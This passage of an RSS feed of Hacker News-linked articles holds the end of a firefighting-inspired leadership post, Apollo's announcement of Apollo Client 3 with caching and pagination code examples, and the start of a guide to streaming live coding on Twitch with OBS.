fire</h4></figcaption></figure><h2 id="lesson-2-celebrate-them">Lesson 2: Celebrate them!</h2><p>Celebrate your team and celebrate with the team. I mention it here explicitly because I forgot it too often. Especially as a lead your rhythm is not always synced with the team. It happened regularly to me that during the last phase of a project I was already snowed under with organizational tasks for the next project.</p><p>A simple “thank you” might be enough, or sometimes a big party together with the team is called for. When the team has accomplished something and can move on to the well-deserved resting time, the lead should think about the celebration and how she can thank people. Firefighters sacrifice their free time and join training events while they could spend time with their families, friends, or just enjoy their free time in another way.</p><p>Our fire department is in a higher region in the mountains in Innsbruck in Austria and it happened several times that the team was on duty for several days during natural disasters in winter (snow) and summer (floodings). It is not a big deal to invite over friends and family to a small dinner party in the fire department but you show the appreciation of all the people involved.</p><figure><img src="https://wolfgang.gassler.org/firefighter-experience-impact-on-leadership-style/thankyou.JPG" srcset="https://wolfgang.gassler.org/firefighter-experience-impact-on-leadership-style/thankyou_huf4ae24ba605289f9976a997829732901_242871_360x0_resize_q75_box.JPG 360w, https://wolfgang.gassler.org/firefighter-experience-impact-on-leadership-style/thankyou_huf4ae24ba605289f9976a997829732901_242871_700x0_resize_q75_box.JPG 700w" sizes="(max-width: 37.5em) 360px, (min-width: 700px) 700px"><figcaption><h4>Saying thank you is crucial, not only because we rely on the younger generation in our fire department.</h4></figcaption></figure><p>Your development team might also run into similar exhausting situations. They do over-hours for several weeks to meet a deadline or just work very hard because they believe in the project. This is not the norm and you should thank them. There are many ways of saying “thank you”, and it can range from thanks you deliver in a 1:1 meeting to a bigger team event activity outside of your daily work environment. For me, it is always important that it is an honest “thank you” and that it is not just two words. Again, they could also spend their time in a different way and also other companies pay their employees, that is not unique to you.</p><h2 id="lesson-3-know-your-people-and-support-their-development">Lesson 3: Know your people and support their development</h2><p>It sounds obvious, but do you know your people? Can you answer the following questions for every team member?</p><ul><li>What are the three biggest strengths of the team member?</li><li>What are the motivational factors of the person?</li><li>What non-job-related interests does this person have?</li></ul><p>In our fire department we need people who take responsibility over the IT system, fire trucks, equipment &amp; tools maintenance, operational uniforms, and a lot of other areas. When entering a burning house you better know that the maintenance of tools and equipment was done in a proper way. It is not sufficient to just distribute the responsibilities, you have to know about the passion of people and if they really want to do it. Furthermore, you have to judge if they can and want to learn everything they need to know to take over a responsibility area.</p><figure><img src="https://wolfgang.gassler.org/firefighter-experience-impact-on-leadership-style/abseilen_hu041ad4f09540c8d3b36482d8c3bcbb51_3061870_1500x0_resize_q75_box.jpg" srcset="https://wolfgang.gassler.org/firefighter-experience-impact-on-leadership-style/abseilen_hu041ad4f09540c8d3b36482d8c3bcbb51_3061870_360x0_resize_q75_box.jpg 360w, https://wolfgang.gassler.org/firefighter-experience-impact-on-leadership-style/abseilen_hu041ad4f09540c8d3b36482d8c3bcbb51_3061870_700x0_resize_q75_box.jpg 700w" sizes="(max-width: 37.5em) 360px, (min-width: 700px) 700px"><figcaption><h4>Going beyond personal limits during self-rescue training, abseiling on the wall of a building.</h4></figcaption></figure><p>In a company or team you also find a variety of different tasks that have to be done. Especially in smaller companies you do not have specialists for every single area. This can be a burden but also an opportunity for people to not only do their main job and get bored. Some people like to do other things from time to time and also learn new things.</p><p>A good example is recruiting. Not everybody wants to do it and not everybody is suited for it. You have to know your people and sometimes, also push them a bit to take on new challenges. Some people underestimate themselves very often and think they do not know enough to take on a new challenge. It doesn’t matter if it is about taking the tech lead role of a new project, recruiting, or switching from an individual contributor role to a manager role. When you know people, their skills and interests, you can judge better if they are capable of doing it and you can help or motivate them to find new challenges and develop their skills.</p><h2 id="lesson-4-say-yes">Lesson 4: Say yes!</h2><p>There are tons of leadership articles out there that state saying no is crucial. In a lot of situations that might be true but I disagree with them when it is about company or team culture. Think about yourself and how you feel when approaching somebody with a suggestion and then you get the reply “no” or the more or less equivalent “yes, but…”. I call those phrases motivational killers and using it leads to frustrated team members.</p><p>Saying yes doesn’t mean that you have to accept or like everything. For example, the answer “Yes, that sounds like a feasible idea. How would you implement it?” doesn’t mean that you agreed with it. You can ask more questions and analyze the proposal together with the team member. In the worst case, by answering your questions, the person realizes that there might be some issues with the idea. In the best case, it is worth working on it and there is already a team member who buys in and wants to work on this project.</p><p>I heard a lot of ideas from really young firefighters who proposed new ways of training or super cool training objects like old dry Christmas trees (see image at the beginning of the article). Sometimes, especially with more senior people, a “yes, great idea” as a supporting sign from the lead can be …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://wolfgang.gassler.org/firefighter-experience-impact-on-leadership-style/#not-only-for-managers">https://wolfgang.gassler.org/firefighter-experience-impact-on-leadership-style/#not-only-for-managers</a></em></p>]]>
            </description>
            <link>https://wolfgang.gassler.org/firefighter-experience-impact-on-leadership-style/#not-only-for-managers</link>
            <guid isPermaLink="false">hacker-news-small-sites-23835909</guid>
            <pubDate>Tue, 14 Jul 2020 18:38:13 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Apollo GraphQL Releases Apollo Client 3, a Client-Side Data Graph Library]]>
            </title>
            <description>
<![CDATA[
Score 6 | Comments 0 (<a href="https://news.ycombinator.com/item?id=23834708">thread link</a>) | @stemmlerjs
<br/>
July 14, 2020 | http://go.apollo.dev/c/ac3-release | <a href="https://web.archive.org/web/*/http://go.apollo.dev/c/ac3-release">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<p>Today we’re thrilled to announce the <strong>official release of Apollo Client 3.0</strong>! This release is the culmination of 55 betas, 14 release candidates, and hundreds of resolved issues and merged pull requests over the past eleven months. Phew!</p>



<p>To everyone who’s tried out AC3 during this extended beta period, <em>thank you</em>. We couldn’t have reached this milestone without your continued feedback and support. And to everyone who’s been waiting for the official launch, we appreciate your patience. Yes, it really is finally here!</p>



<p><strong>Here’s a recap of what’s new, with links to related documentation:</strong></p>



<ul><li>A single, consolidated <code>@apollo/client</code> package<ul><li>Includes entry points like <code>@apollo/client/utilities</code> for efficient use <em>without</em> the core library</li></ul></li><li>New <code>InMemoryCache</code> APIs:<ul><li><a href="https://www.apollographql.com/docs/react/caching/garbage-collection/#cacheevict" target="_blank" rel="noreferrer noopener">Eviction of objects and fields</a></li><li><a href="https://www.apollographql.com/docs/react/caching/garbage-collection/#cachegc" target="_blank" rel="noreferrer noopener">Garbage collection</a></li><li>Configurable policies for <a href="https://www.apollographql.com/docs/react/caching/cache-configuration/#typepolicy-fields" target="_blank" rel="noreferrer noopener">types</a> and <a href="https://www.apollographql.com/docs/react/caching/cache-field-behavior/">fie</a><a href="https://www.apollographql.com/docs/react/caching/cache-field-behavior/" target="_blank" rel="noreferrer noopener">l</a><a href="https://www.apollographql.com/docs/react/caching/cache-field-behavior/">ds</a></li><li>Pagination helpers</li></ul></li><li>Improved <a href="https://www.apollographql.com/docs/react/local-state/local-state-management/" target="_blank" rel="noreferrer noopener">local state management</a></li><li>Expanded and refined UI reactivity:<ul><li><a href="https://www.apollographql.com/docs/react/local-state/reactive-variables/" target="_blank" rel="noreferrer noopener">Reactive variables</a></li><li>More reliable cache broadcast behavior</li><li>More predictable <code>FetchPolicy</code> enforcement</li></ul></li><li>Extensive internal refactoring</li></ul>



<p>Before diving into some of those features here, I’d like to talk a bit about Apollo Client’s cache-focused design philosophy, which informed just about everything that’s included in this release.</p>



<h2>The purpose of a GraphQL client library</h2>



<p>You can consume GraphQL with anything that makes an HTTP request, such as <code>fetch</code> in the browser or <code>curl</code> on the command line. Whichever tool you use, you get all the classic GraphQL benefits: fetching exactly the data you need, in exactly the shape you need, with a single network request.</p>



<p><em>But.</em> Modern client applications use <strong>caching</strong> extensively to improve performance and user experience. And generic HTTP caching just doesn’t work with GraphQL. Every time you request even slightly different data, your HTTP-cached value is invalidated, making it useless for an application of any complexity.</p>



<p>GraphQL data is inherently, well, <em>graphical</em>. And to support GraphQL data effectively, a cache needs to <em>reflect</em> that graphical structure. HTTP caching can’t do this, but a library like Apollo Client <em>can</em>. In our opinion, this is the most important functionality that a GraphQL client library can provide.</p>



<h3>The client-side data graph</h3>



<p>When Apollo Client fetches data from your server, it caches that data using a <a rel="noreferrer noopener" href="https://www.apollographql.com/docs/react/caching/cache-configuration/#data-normalization" target="_blank">normalized structure</a> that matches your GraphQL schema. By caching this data, <em>Apollo Client locally reconstructs a subset of your back-end data graph</em>. This means that the next time Apollo Client queries some of that same data, it can fetch it directly from the cache, <em>even if an entirely different query requests it</em>. The cache only falls back to contacting your remote server when local data is missing or invalidated. And like any other GraphQL server, the cache provides APIs to <a rel="noreferrer noopener" href="https://www.apollographql.com/docs/react/caching/cache-configuration/#typepolicy-fields" target="_blank">define how types and fields are read and modified</a>.</p>



<p>Because the cache is integrated directly with Apollo Client, it knows exactly which queries use exactly which fields in your graph. Whenever a cached field’s value changes, Apollo Client automatically updates all of the queries that include that field. This makes the cache just as reactive as any other part of a modern web application.</p>



<p>It’s because of the cache-focused philosophy behind Apollo Client that we don’t think of it primarily as a library for executing GraphQL operations, but rather as <strong>a library for interacting with a client-side data graph</strong>.</p>



<h2>Feature Spotlight</h2>



<p>This is far from everything that’s new in AC3, but it’s some of what we’re most excited for you to try out in your application!</p>



<h3>Reactive variables</h3>



<p>A <a rel="noreferrer noopener" href="https://www.apollographql.com/docs/react/local-state/reactive-variables/" target="_blank">reactive variable</a> is a value that registers a dependency when you read it, and later triggers re-reading whenever the value is updated. The concept has been around for decades, predating <a rel="noreferrer noopener" href="https://docs.meteor.com/api/reactive-var.html" target="_blank">Meteor’s <code>ReactiveVar</code> API</a> back in 2014. Reactive variables are a staple of reactive programming, and now they enable flexible new ways of storing local state in AC3.</p>



<p>When you modify a reactive variable created with the <code>makeVar</code> function, Apollo Client automatically updates every active query that depends on that variable’s value. This is similar to what happens whenever a field in the cache changes, <em>however</em>: reactive variables <em>aren’t in the cache</em>. That means they can hold data of any type and structure, and you can interact with them throughout your application without using GraphQL syntax.</p>



<p>As a company with a long history of creating and consuming reactive variable APIs, we genuinely believe that this addition to Apollo Client will have a transformative effect on local state management.</p>



<p>Here’s an example:</p>



<pre><code>

<span>import</span> <span>{</span>
  InMemoryCache<span>,</span>
  makeVar<span>,</span>
  gql<span>,</span>
  useQuery<span>,</span>
<span>}</span> <span>from</span> <span>"@apollo/client"</span>




<span>const</span> darkModeVar <span>=</span> <span>makeVar</span><span>(</span><span>false</span><span>)</span><span>;</span>

<span>const</span> cache <span>=</span> <span>new</span> <span>InMemoryCache</span><span>(</span><span>{</span>
  typePolicies<span>:</span> <span>{</span>
    Query<span>:</span> <span>{</span>
      fields<span>:</span> <span>{</span>
        
        
        
        <span>darkModeEnabled</span><span>(</span><span>)</span> <span>{</span>
          <span>return</span> <span>darkModeVar</span><span>(</span><span>)</span><span>;</span>
        <span>}</span><span>,</span>
      <span>}</span><span>,</span>
    <span>}</span><span>,</span>
  <span>}</span><span>,</span>
<span>}</span><span>)</span><span>;</span>



<span>function</span> <span>App</span><span>(</span><span>)</span> <span>{</span>
  <span>const</span> <span>{</span> data<span>,</span> loading <span>}</span> <span>=</span> <span>useQuery</span><span>(</span>
    gql<span><span>`</span><span>query { darkModeEnabled @client }</span><span>`</span></span><span>,</span>
  <span>)</span><span>;</span>
  <span>return</span> loading <span>?</span> <span><span><span>&lt;</span><span>Loading</span></span><span>/&gt;</span></span> <span>:</span>
    <span><span><span>&lt;</span>div</span> <span>className</span><span><span>=</span><span>{</span>data<span>.</span>darkModeEnabled <span>?</span> <span>"dark"</span> <span>:</span> <span>"light"</span><span>}</span></span><span>&gt;</span></span><span>...</span><span><span><span>&lt;/</span>div</span><span>&gt;</span></span><span>;</span>
<span>}</span>





<span>function</span> <span>toggleDarkMode</span><span>(</span><span>)</span> <span>{</span>
  <span>darkModeVar</span><span>(</span><span>!</span><span>darkModeVar</span><span>(</span><span>)</span><span>)</span><span>;</span>
<span>}</span></code></pre>



<h3>Cache field policies</h3>



<p>You can define a <a rel="noreferrer noopener" href="https://www.apollographql.com/docs/react/caching/cache-field-behavior/" target="_blank">field policy</a> for any and every GraphQL field that appears in your cache. A field policy can include a <a rel="noreferrer noopener" href="https://www.apollographql.com/docs/react/caching/cache-field-behavior/#the-read-function" target="_blank"><code>read</code> function</a> that customizes what happens when the field is read from the cache, and a <a rel="noreferrer noopener" href="https://www.apollographql.com/docs/react/caching/cache-field-behavior/#the-merge-function" target="_blank"><code>merge</code> function</a> that customizes what happens when it’s written.</p>



<pre><code><span>const</span> cache <span>=</span> <span>new</span> <span>InMemoryCache</span><span>(</span><span>{</span>
  typePolicies<span>:</span> <span>{</span>
    Person<span>:</span> <span>{</span>
      fields<span>:</span> <span>{</span>
        name<span>:</span> <span>{</span>
          <span>read</span><span>(</span><span>name</span><span>)</span> <span>{</span>
            
            <span>return</span> name<span>.</span><span>toUpperCase</span><span>(</span><span>)</span><span>;</span>
          <span>}</span>
        <span>}</span>
      <span>}</span><span>,</span>
    <span>}</span><span>,</span>
  <span>}</span><span>,</span>
<span>}</span><span>)</span><span>;</span></code></pre>



<p><strong>You can even do this for fields that aren’t in your schema!</strong> Such <a href="https://www.apollographql.com/docs/react/local-state/managing-state-with-field-policies/" target="_blank" rel="noreferrer noopener">local-only fields</a> are the basis for using AC3 to query both local and remote data simultaneously.</p>



<p>By defining all of this custom field logic in one place (the constructor of <code>InMemoryCache</code>), you avoid repeating code, and your teammates can interact with the types and fields you’ve configured <em>without</em> needing to understand how they’re stored or fetched.</p>



<p>After <a href="https://www.apollographql.com/docs/react/caching/cache-field-behavior/" target="_blank" rel="noreferrer noopener">reading the documentation</a>, you’ll have the tools to write your own field policies to handle use cases like:</p>



<ul><li>Default field values</li><li>Transforming or normalizing field values</li><li>Sorting and slicing lists</li><li>Exposing reactive variables as GraphQL fields</li><li>Using references to redirect to data elsewhere in the cache</li><li>Pagination (covered below as well)</li><li>…&nbsp;and much more!</li></ul>



<h3>Pagination helpers</h3>



<p>One of the most compelling use cases for a custom field policy is to handle <strong>paginated lists</strong> of data without baking any specific pagination logic into Apollo Client.</p>



<p>Even with field policies, though, it can be tricky to get pagination exactly right. With so many details to digest, you might want to start with one of our prewritten helper functions.</p>



<p>Here’s how you can consume search results from a Relay-friendly GraphQL server, such as the <a rel="noreferrer noopener" href="https://metaphysics-production.artsy.net/" target="_blank">Artsy search API</a>:</p>



<pre><code><span>import</span> <span>{</span> ApolloClient<span>,</span> InMemoryCache <span>}</span> <span>from</span> <span>"@apollo/client"</span><span>;</span>
<span>import</span> <span>{</span> relayStylePagination <span>}</span> <span>from</span> <span>"@apollo/client/utilities"</span><span>;</span>

<span>const</span> client <span>=</span> <span>new</span> <span>ApolloClient</span><span>(</span><span>{</span>
  uri<span>:</span> <span>"https://metaphysics-production.artsy.net/"</span><span>,</span>
  cache<span>:</span> <span>new</span> <span>InMemoryCache</span><span>(</span><span>{</span>
    typePolicies<span>:</span> <span>{</span>
      Query<span>:</span> <span>{</span>
        fields<span>:</span> <span>{</span>
          
          
          
          search<span>:</span> <span>relayStylePagination</span><span>(</span><span>[</span><span>"query"</span><span>]</span><span>)</span><span>,</span>
        <span>}</span><span>,</span>
      <span>}</span><span>,</span>
    <span>}</span><span>,</span>
  <span>}</span><span>)</span><span>,</span>
<span>}</span><span>)</span><span>;</span>

<span>function</span> <span>BasquiatSearchResults</span><span>(</span><span>)</span> <span>{</span>
  <span>const</span> <span>{</span> data<span>,</span> loading<span>,</span> fetchMore <span>}</span> <span>=</span> <span>useQuery</span><span>(</span>gql<span><span>`</span><span>
    query BasquiatQuery($afterCursor: string) {
      search(query: "basquiat", first: 10, after: $afterCursor) {
        edges {
          node {
            displayLabel
          }
        }
        pageInfo {
          endCursor
        }
      }
    }
  </span><span>`</span></span><span>)</span><span>;</span>

  <span>if</span> <span>(</span>loading<span>)</span> <span>return</span> <span>&lt;</span>Loading <span>/</span><span>&gt;</span><span>;</span>

  <span>return</span> <span>(</span>
    <span>&lt;</span>div<span>&gt;</span>
      <span>&lt;</span>ul<span>&gt;</span>
        <span>{</span>data<span>.</span>search<span>.</span>edges<span>.</span><span>map</span><span>(</span><span>edge</span> <span>=&gt;</span> <span>(</span>
          <span>&lt;</span>li<span>&gt;</span><span>{</span>edge<span>.</span>node<span>.</span>displayLabel<span>}</span><span>&lt;</span><span>/</span>li<span>&gt;</span>
        <span>)</span><span>)</span><span>}</span>
      <span>&lt;</span><span>/</span>ul<span>&gt;</span>
      <span>&lt;</span>input
        <span>type</span><span>=</span><span>"button"</span>
        value<span>=</span><span>"load more"</span>
        onClick<span>=</span><span>{</span><span>(</span><span>)</span> <span>=&gt;</span> <span>fetchMore</span><span>(</span><span>{</span>
          variables<span>:</span> <span>{</span>
            afterCursor<span>:</span> data<span>.</span>search<span>.</span>pageInfo<span>.</span>endCursor<span>,</span>
          <span>}</span><span>,</span>
          
          
        <span>}</span><span>)</span><span>}</span>
      <span>/</span><span>&gt;</span>
    <span>&lt;</span><span>/</span>div<span>&gt;</span>
  <span>)</span><span>;</span>
<span>}</span></code></pre>



<p>If you’ve ever read Relay’s <a rel="noreferrer noopener" href="https://relay.dev/graphql/connections.htm" target="_blank">GraphQL Cursor Connections specification</a>, you know how complex Relay pagination can be, so it’s a big help to capture that complexity in a single helper function.</p>



<blockquote><p>If you find your own field policies becoming repetitive, don’t forget that you can reuse logic! Write a helper function that generates a generic field policy, and that takes parameters for customization.</p></blockquote>



<p>Following this release, we’ll continue collecting useful cache policy helper functions like <code>offsetLimitPagination</code> and <code>relayStylePagination</code> in <code>@apollo/client/utilities</code>. Feel free to use them directly in your own code, or adapt them to your own specific needs!</p>



<h2>Release FAQ</h2>



<h3>How do I get started?</h3>



<p>If you have an existing application that uses Apollo Client 2.x, check out the <a href="https://www.apollographql.com/docs/react/migrating/apollo-client-3-migration/" target="_blank" rel="noreferrer noopener">migration guide</a> and refreshed <a href="https://www.apollographql.com/docs/react/" target="_blank" rel="noreferrer noopener">documentation</a>, as certain concepts and interfaces have changed. We’ve worked hard to ensure that every required change is a <em>positive</em> one that makes logical sense and leaves you feeling better about your application and its data.</p>



<p>If you’re brand new to Apollo Client, <a href="https://www.apollographql.com/docs/react/get-started/" target="_blank" rel="noreferrer noopener">get started here</a>!</p>



<h3>Is AC3 a complete rewrite of Apollo Client?</h3>



<p>No. We care deeply about providing a pleasant migration between software versions, and the majority of 2.x functionality remains in 3.0. You can <a href="https://www.apollographql.com/docs/react/migrating/apollo-client-3-migration/" target="_blank" rel="noreferrer noopener">migrate to AC3</a> now and incrementally adopt its features on your own timeline. Note that some 2.x features (such as local resolvers) are now officially deprecated.</p>



<p>Even though it <em>isn’t</em> a rewrite, AC3 includes features that needed a while to bake. As one example, the new <a href="https://www.apollographql.com/docs/react/caching/garbage-collection/#cacheevict" target="_blank" rel="noreferrer noopener"><code>cache.evict</code> API</a> (<a href="https://github.com/apollographql/apollo-client/pull/5310" target="_blank" rel="noreferrer noopener">#5310</a>) enables you to remove objects and individual fields from the cache. Initial versions of this feature made it possible to leave the cache in a broken state after evicting critical data. To address …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="http://go.apollo.dev/c/ac3-release">http://go.apollo.dev/c/ac3-release</a></em></p>]]>
            </description>
            <link>http://go.apollo.dev/c/ac3-release</link>
            <guid isPermaLink="false">hacker-news-small-sites-23834708</guid>
            <pubDate>Tue, 14 Jul 2020 17:13:41 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How to Run a Live Coding Stream on Twitch Using OBS]]>
            </title>
            <description>
<![CDATA[
Score 450 | Comments 170 (<a href="https://news.ycombinator.com/item?id=23834153">thread link</a>) | @jordanlewis
<br/>
July 14, 2020 | https://jordanlewis.org/posts/twitch-live-coding/ | <a href="https://web.archive.org/web/*/https://jordanlewis.org/posts/twitch-live-coding/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
	<article>
		
		

		<section>
    <div>
      <p><img src="https://jordanlewis.org/images/stream/streaming-desk.jpg" alt="Stream software picture"></p>
<p>If you’re reading this post, you might be interested in trying your hand at
live coding on stream, as a way of sharing your projects in a more relatable,
immediate way than a polished blog post, teaching others about programming, or
just as a way to have fun. I think that live coding and streams in general are
an interesting possible future form of both education and entertainment, and if
you’re contemplating starting your own stream, I sincerely hope that you do it.</p>
<p>This month marks the 6 month anniversary of the first stream on <a href="https://twitch.tv/large__data__bank">LARGE DATA
BANK</a>, my Twitch live coding channel. It’s
grown from a one-off Friday experiment into a regularly scheduled part of my
life, a community of dozens of wonderful regular viewers and chatters, and
an activity that’s one of the top things I look forward to doing every week.</p>
<p>I’ve learned a lot along the way, and this detailed guide to the way I’ve
set up my stream is my attempt at stepping back and sharing those learnings in
the hopes of inspiring others to try this awesome hobby for themselves. I hope
it’s useful for you as you start your own journey into streaming.</p>
<p>If you have any questions that aren’t answered in this blog post, I’m more than
happy to answer them <a href="https://twitter.com/JordanALewis">on Twitter</a> or
<a href="https://jordanlewis.org/">elsewhere online</a>.</p>
<p>Also, please send me a follow on <a href="https://largedatabank.com/">Twitch</a> and
<a href="https://twitter.com/JordanALewis">Twitter</a> for stream notifications! I stream
every Friday at 3 PM ET, and most Sundays at some time in the afternoon.</p>
<nav id="TableOfContents">
  <ul>
    <li><a href="#intro">Intro</a></li>
    <li><a href="#obs-configuration">OBS configuration</a>
      <ul>
        <li><a href="#scenes">Scenes</a></li>
        <li><a href="#video">Video</a></li>
        <li><a href="#audio">Audio</a></li>
        <li><a href="#streaming-to-twitch-finally">Streaming to Twitch (finally)</a></li>
      </ul>
    </li>
    <li><a href="#stream-alerts">Stream Alerts</a>
      <ul>
        <li><a href="#sound-in-stream-alerts">Sound in Stream Alerts</a></li>
      </ul>
    </li>
    <li><a href="#channel-setup">Channel setup</a>
      <ul>
        <li><a href="#stream-category-and-tags">Stream Category and Tags</a></li>
        <li><a href="#panels">Panels</a></li>
        <li><a href="#emotes">Emotes</a></li>
        <li><a href="#banner-image">Banner image</a></li>
        <li><a href="#saving-videos">Saving Videos</a></li>
      </ul>
    </li>
    <li><a href="#chatbot">Chatbot</a></li>
    <li><a href="#becoming-a-twitch-affiliate">Becoming a Twitch Affiliate</a></li>
    <li><a href="#shoutouts">Shoutouts</a></li>
  </ul>
</nav>


<p>Whatever your reasons for wanting to try streaming, there’s quite a bit of setup
that you’ll need to do up front to try it out that can feel daunting. Everyone
has to go through this initial setup period, though, and so can you. You got
this!</p>
<p>The most important part of this post is the
<a href="#obs-configuration">section</a> about
<a href="https://obsproject.com/">OBS</a>, which is the awesome, cross-platform, free and
open source streaming software that most of the community uses. OBS will be
your best friend on your streaming journey! You will use it to control your
webcam, desktop, audio, and every other element that goes into the final
product of your livestream.</p>
<p>The rest of the post focuses on configuration that’s more specific to Twitch.
I like to use Twitch because I like the culture that’s developed there over
time, but plenty of people think that YouTube Live is more appropriate for
professional content. I’m not too familiar with YouTube Live, but most of the
discussion about OBS should apply the same for YouTube as it does for Twitch:
the main difference is that you’ll configure OBS to send to your YouTube
account instead of Twitch in Stream settings.</p>
<blockquote>
<p><strong><em>Yo!</em> If you’re trying to set up your very first stream</strong>, you really
don’t need most of the stuff in this guide, which represents what I’ve built
gradually over the past 6 months, stream by stream. My recommendation for the
livecoding-curious is to try streaming with a bare-bones setup, to see how
you like it, before investing in expensive gear or diving into hours of
configuration and asset creation. You can accomplish this in several hours
over a weekend. Set up a single scene in OBS with your captured desktop as
the background and your webcam in the corner, with your microphone configured
under Mic/Aux. That’s all you need: a simple setup for streaming your coding
is now yours! I’ll cover how to make that happen below, in the OBS
Configuration section. Just ignore most of the extra scenes and various bells
and whistles, and you’ll be good to go.</p>
</blockquote>

<p><a href="https://obsproject.com/">OBS</a> is where you’ll produce everything that your
viewers can see and hear on the live video, including your desktop, the camera
with your beautiful face on it, your voice, and any stream alerts, overlays,
text, or other information that you might want to show to your viewers.</p>
<p><img src="https://jordanlewis.org/images/stream/desktop2.png" alt="Desktop"></p>
<p>There’s a lot to cover with OBS and I’m not going to try to explain all of it,
so I’ll just talk about what’s worked for me. To make something that suits you,
you’ll need to flex your creative muscles! You can use the ideas here as a
starting place, but you’ll need to dive into OBS and play around: everyone’s
setup is going to be different.</p>
<h2 id="scenes">Scenes <a href="#scenes" arialabel="Anchor"><i data-feather="link-2"></i></a> </h2>
<p>A <em>scene</em> is OBS’s name for a particular layout of video and audio components
on a stream. Typically, you’ll see Twitch streamers stay on a single scene for
most of their stream: their game, desktop, or whatever their focus is. But it’s
handy to have a few extra ones for the intro and outro to your stream,
something that covers the screen for when you want to take a break, and so on.</p>
<p><img src="https://jordanlewis.org/images/stream/scenes.png" alt="Scenes popped out"></p>
<p>I have the main scenes that I use bound to global hotkeys, so I can switch
between them without having to click around in OBS. Unfortunately, sometimes
the hotkeys stop working during the stream - I’ve yet to figure out exactly why
this happens. If you happen to have this same problem and have found a
workaround, please let me know!</p>
<p>I have 6 primary scenes, and a couple of child scenes that are embedded in
several main scenes to deduplicate on-screen elements (the ones below the
<code>-----</code> in the picture). However, I spend the vast majority of my stream on one
of them: the Desktop scene.</p>
<h3 id="desktop">Desktop <a href="#desktop" arialabel="Anchor"><i data-feather="link-2"></i></a> </h3>
<p>This scene is the workhorse of the stream, and the one that’s active 95% of the
time. It consists of a full-screen, 1080p Display Capture source of my external
monitor. This is convenient because it leaves no ambiguity about what’s catpured
on the stream (it’s the whole monitor) and leaves my laptop screen free for
the OBS window, monitoring chat, and anything else that I want to look at while
streaming without having to show my viewers.</p>
<p>My <a href="https://jordanlewis.org/posts/desk-setup-2020">Desktop setup post</a> goes into more detail about the
way that I’ve set up my desk to have two monitors. It’s so convenient for the
stream that I’m hooked, and I’m not sure how I’d manage without.</p>
<p><img src="https://jordanlewis.org/images/stream/desktopscene.png" alt="Desktop Scene in OBS"></p>
<blockquote>
<p>A quick note on font size: you have to make your text editor font quite large
to make it legible for your viewers! It will take a little while to get used
to this. I use 26-point font in my editor, which provides only about 30
visible horizontal lines of code. This is next to nothing compared to the
amount of context you’re probably used to seeing while programming. This
hamstringing is worth it, though: the bigger your font, the more likely it is
that your viewers will be able to follow along with what you’re doing, stay
engaged, ask questions, learn, and have fun.</p>
<p>You should also try to remove as many distracting elements from your editor
and desktop as possible while streaming, to keep the focus on the code. For
me, this has meant disabling the Mac’s menubar and Dock, and removing the
vast majority of toolbars from my IDE.</p>
</blockquote>
<p>Besides the desktop capture source, which is at the back of the scene, I’ve
added several other sources:</p>
<ol>
<li>Face cam, which is a video source from my capture card (more information about the video sources in the <a href="#video">Video</a> section)</li>
<li>Keyboard cam, which is a video source from a webcam pointed at my keyboard.</li>
<li>A couple of text boxes, to show my most recent subscriber, follower, and
some on-stream commands. The text boxes are updated automatically by the
<a href="https://streamlabs.com/dashboard#/streamlabels">StreamLabels</a> app.</li>
<li>A web page source connected to Streamlabs Stream Alerts, which I’ll cover <a href="#stream-alerts">below</a>.</li>
</ol>
<p>I definitely didn’t start with all of these elements - it’s quite a lot of work
to tweak things just the way you want - but I’ve kept this configuration for the
past couple of months and I like the way it looks.</p>
<h3 id="whiteboard">Whiteboard <a href="#whiteboard" arialabel="Anchor"><i data-feather="link-2"></i></a> </h3>
<p>The whiteboard scene is meant to showcase my iPad full screen, allowing me to
draw things on stream to demonstrate ideas or concepts. I use the Concepts app
on the iPad along with an Apple Pencil for drawing, and it works pretty nicely.</p>
<p><img src="https://jordanlewis.org/images/stream/whiteboard.png" alt="Whiteboard scene"></p>
<p>I didn’t know how to fill up the space on the bottom left, since the iPad
doesn’t have a widescreen aspect ratio like my monitor does, so I put a picture
that my friend Aileen drew of me to make the stream a bit more visually
interesting!</p>
<p>This scene references the same facecam and alerts source as the Desktop scene.
You can definitely use DRY principles in OBS, just like software - but it does
get tricky to keep everything de-duplicated.</p>
<h3 id="ipad-green-screen-overlay">iPad Green Screen Overlay <a href="#ipad-green-screen-overlay" arialabel="Anchor"><i data-feather="link-2"></i></a> </h3>
<p>I also set up a “green screen” configuration for the iPad that I can overlay
over any other scene with a global hotkey. This gives me the ESPN football
announcer effect during my stream: I can draw on my iPad, and the lines will
appear overlayed on top of whatever else I have on stream at the time.</p>
<p>This is probably the most complex video element on my
stream, but OBS makes it pretty simple to set up. I added a Color Key filter
with a black background on top of the raw iPad video feed, set my drawing app
to have a black background, and tweaked the Color Key settings in OBS until
things looked right:</p>
<p><img src="https://jordanlewis.org/images/stream/colorkey.png" alt="iPad Color Key"></p>
<p>I don’t use this element as nearly as often as I’d like, but I think it’s
pretty neat. I recorded a <a href="https://www.youtube.com/watch?v=U4WJQmN1cSo">demo
video</a> of it if you’re curious for
how it looks - I also use it occasionally on the stream.</p>
<h3 id="selfie">Selfie <a href="#selfie" arialabel="Anchor"><i data-feather="link-2"></i></a> </h3>
<p>This is just a full-screen version of the facecam. I copied the name of the
scene from <a href="https://medium.com/@suzhinton/my-twitch-live-coding-setup-b2516672fb21">@noopkat’s
blog</a>.</p>
<p><img src="https://jordanlewis.org/images/stream/selfie.png" alt="Selfie scene"></p>
<p>I use this scene for “turn to the camera” moments, which I find really fun. I’ll
switch to the scene, look right at the camera, and talk for a bit before
switching back to the desktop view.</p>
<h3 id="starting-soon">Starting Soon <a href="#starting-soon" arialabel="Anchor"><i data-feather="link-2"></i></a> </h3>
<p>This scene goes on as soon as the stream turns on, until I’m ready to start
talking to the camera. I’ll usually start the stream a few minutes before the
time that I announced on Twitter for my stream, and leave it up until that time
comes (with a muted mic!).</p>
<p><img src="https://jordanlewis.org/images/stream/startingsoon.png" alt="Starting Soon scene"></p>
<p>I used a gif I found on the internet of someone typing, so people can tell that
the stream is live even though there’s nothing happening yet. There’s also music
during this “pre-roll”. I’ll talk about music and sound <a href="#audio">later</a>).</p>
